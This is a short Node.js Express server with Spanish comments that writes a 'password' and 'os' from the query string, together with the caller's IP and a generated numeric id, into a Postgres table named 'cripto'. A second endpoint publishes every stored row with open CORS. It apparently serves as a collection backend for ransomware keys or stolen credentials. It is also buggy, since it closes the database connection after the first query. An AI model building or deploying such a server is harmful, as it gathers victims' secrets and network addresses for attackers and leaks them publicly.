const express = require('express');
const app = express();
const cors = require('cors');
const { Client } = require('pg');
const generateUniqueId = require('generate-unique-id');

app.use(express.urlencoded({extended:false}));
app.use(express.json());
app.use(cors());


const client = new Client({
	connectionString: process.env.DATABASE_URL, //
	ssl: {rejectUnauthorized: false}
  })


///////////////////////////////////////////////
  client.connect();
  let datos ={};
  
  client.query('SELECT * from cripto', (err, res) => {
	  // console.log(err, res) 
	  //console.log(res.Result.rows)
	  datos = res;
	  console.log(res);
	  client.end();

	  })

	  // tabla en json
 	 app.get('/tabla', (req,res)=>{
		res.send(datos.rows);
 	})
///////////////////////////////////////////////
	
	app.get('/datos', (req,res)=>{
		console.log(req.query)
		const id = generateUniqueId({length: 8,useLetters: false});
		client.query('insert into cripto(password, so, ip, id) values ($1,$2,$3,$4)RETURNING *',[req.query.password, req.query.os, req.headers['x-forwarded-for'], id], (err, res) => {
			// console.log(err, res) 
			//console.log(res.Result.rows)
			datos = res;
			console.log(res);
			client.end();
	  
			})

 	})

///////////////////////////////////////////////



app.listen(process.env.PORT,()=>{
	console.log("funcionando");
})
